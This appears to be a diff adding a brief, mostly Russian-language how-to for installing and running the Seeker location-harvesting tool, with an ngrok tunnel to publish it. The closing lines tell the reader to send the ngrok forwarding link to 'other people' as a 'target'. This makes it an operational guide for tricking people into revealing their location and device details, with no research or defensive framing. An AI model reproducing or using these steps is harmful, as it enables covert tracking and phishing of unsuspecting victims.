@@ -1,0 +1,35 @@
+Установка Seeker::
+
+    sudo apt update
+
+    sudo apt install python3 python3-pip php ssh git
+
+    pip3 install requests
+
+    git clone https://github.com/thewhiteh4t/seeker
+
+    cd seeker/
+
+    python3 ./seeker.py -h
+
+
+Установка Ngrok::
+
+    wget `curl -s https://ngrok.com/download | grep -o -E 'https://bin.equinox.io/c/[A-Za-z0-9]{4,}/ngrok-stable-linux-amd64.zip'`
+
+    unzip ngrok-stable-linux-amd64.zip
+
+    chmod +x ./ngrok
+
+    ./ngrok -h
+
+
+Инструкция по использованию seeker::
+
+Далее всё очень просто, запускаем seeker::
+
+    python3 ./seeker.py -t manual 
+ 
+ When ==> [+] Waiting for User Interaction... ==> in new konsole open ==> ./ngrok http 8080
+
+Forwarding link it`s link for inject other people --> copy here and drop target
